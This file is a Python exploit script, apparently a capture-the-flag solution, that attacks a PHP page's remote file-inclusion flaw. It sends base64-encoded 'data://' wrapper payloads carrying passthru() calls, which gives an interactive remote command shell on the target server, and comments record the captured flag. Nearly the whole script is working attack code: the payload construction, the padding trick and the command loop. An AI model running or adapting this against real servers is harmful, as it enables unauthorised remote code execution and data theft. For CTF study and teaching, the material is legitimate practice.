from requests import *
from termcolor import colored
import base64 , re

#cat ./3b8a24fe229f7f62e53e1060dca89c6a133f728aa4031f630cb3e59c466d2cb1/3a0436148fef1ad7e3bafaa0259fa99833961abbdc3aaf3e371cc699c1b6314d/f14ggggggggggg
#AD{RF1_Is_v3ry_d4ng3r}

url = 'http://ctf.adl.csie.ncu.edu.tw:8764/index.php'
path = '/var/www/html'

def pac( cmd ):
    global path
    tmp = cmd.split()
    if tmp[0] == 'ls':
        if len(tmp) < 2:
            return cmd + ' ' + path
        elif cmd.find('-') > -1:
            para = tmp[0]
            for c in tmp[1:]:
                para += ' ' + c
                if c[:1] != '-':
                    return para
            return cmd + ' ' + path
        else :
            if tmp[1][0] != '/':
                return 'ls ' + path + '/' + tmp[1]
            else :
                return cmd

    elif tmp[0] == 'cd':
        _pos = path.split('/')
        del _pos[0]
        for ac in tmp[1].split('/'):
            if ac == '' or ac == '.':
                continue
            elif ac == '..':
                if len(_pos) > 0:
                    _pos.pop()
            else :
                _pos.append(ac)
        if len(_pos) > 0:
            if _pos[0] == '':
                del _pos[0]
        path = '/' + '/'.join(_pos)
        return 'cd' + ' ' + path
    elif tmp[0] == 'file' or tmp[0] == 'cat':
        if tmp[1][0] != '/' or tmp[1][:2] == './':
            return  tmp[0] + ' ' + path + '/' + tmp[1]
        else :
            return cmd

    else :
        return cmd


while True:
    cmd = raw_input( colored( path , 'green' ) + colored( '$' , 'red' ) )
    if cmd == '':
        continue
    data = '<?php echo \'ABCD\';echo passthru(\'{}\');echo \'EFGH\';?>'.format( pac(cmd) )
    if cmd.split()[0] == 'pwd':
        print path
        continue
    while base64.b64encode(data).find('=') < 0:
        data = data[:-3] + '//' + data[-3:]
    res = get( url + '?page=data://text/plain;base64,' + base64.b64encode(data) )
    print res.content[ res.content.find('ABCD') + 4 : res.content.find('EFGH') ]
